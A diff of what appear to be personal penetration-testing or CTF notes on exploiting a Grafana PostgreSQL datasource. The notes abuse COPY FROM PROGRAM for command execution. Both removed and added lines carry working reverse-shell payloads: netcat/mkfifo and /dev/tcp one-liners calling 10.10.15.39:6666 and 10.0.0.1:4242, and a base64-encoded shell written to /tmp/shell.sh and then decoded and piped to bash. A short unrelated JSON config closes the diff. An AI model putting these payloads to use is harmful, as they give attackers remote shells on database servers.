@@ -96,17 +96,20 @@ COPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY F
 SELECT * FROM cmd_exec;                 -- [Optional] View the results
 DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
 
-{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"DROP TABLE IF EXISTS cmd_exec;   CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.221 6666 >/tmp/f'; SELECT * FROM cmd_exec;","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":386}],"range":{"from":"2023-10-21T04:58:39.945Z","to":"2023-10-21T10:58:39.945Z","raw":{"from":"now-6h","to":"now"}},"from":"1697864319945","to":"1697885919945"}
-
-
-{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"DROP TABLE IF EXISTS cmd_exec;   CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'echo rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.39 6666 >/tmp/f > /tmp/shell.sh'; SELECT * FROM cmd_exec;","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":386}],"range":{"from":"2023-10-21T04:58:39.945Z","to":"2023-10-21T10:58:39.945Z","raw":{"from":"now-6h","to":"now"}},"from":"1697864319945","to":"1697885919945"}
-
-
-
-{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"DROP TABLE IF EXISTS cmd_exec;   CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'bash -i >& /dev/tcp/10.10.15.39/6666 0>&1'; SELECT * FROM cmd_exec;","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":386}],"range":{"from":"2023-10-21T04:58:39.945Z","to":"2023-10-21T10:58:39.945Z","raw":{"from":"now-6h","to":"now"}},"from":"1697864319945","to":"1697885919945"}
-
 echo cm0gLWYgL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuMzkgNjY2NiA+L3RtcC9mCg== > /tmp/shell.sh
 
-0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
 
-/bin/bash -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1
+{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"DROP TABLE IF EXISTS exploit; CREATE TABLE exploit(cmd_output text); COPY exploit FROM PROGRAM 'echo cm0gLWYgL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTUuMzkgNjY2NiA+L3RtcC9mCg== > /tmp/shell.sh'; SELECT * FROM exploit;","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":656}],"range":{"from":"2023-10-24T12:33:59.955Z","to":"2023-10-24T18:33:59.955Z","raw":{"from":"now-6h","to":"now"}},"from":"1698150839955","to":"1698172439955"}
+
+{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"DROP TABLE IF EXISTS exploit; CREATE TABLE exploit(cmd_output text); COPY exploit FROM PROGRAM 'cat /tmp/shell.sh | base64 -d | bash &'; SELECT * FROM exploit;","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":656}],"range":{"from":"2023-10-24T12:33:59.955Z","to":"2023-10-24T18:33:59.955Z","raw":{"from":"now-6h","to":"now"}},"from":"1698150839955","to":"1698172439955"}
+
+
+
+{
+        "tleroot":"/tmp/test",
+        "updatePerdiod":1,
+        "station": {     
+                "id":1,
+                "name":"hey"
+        }
+}
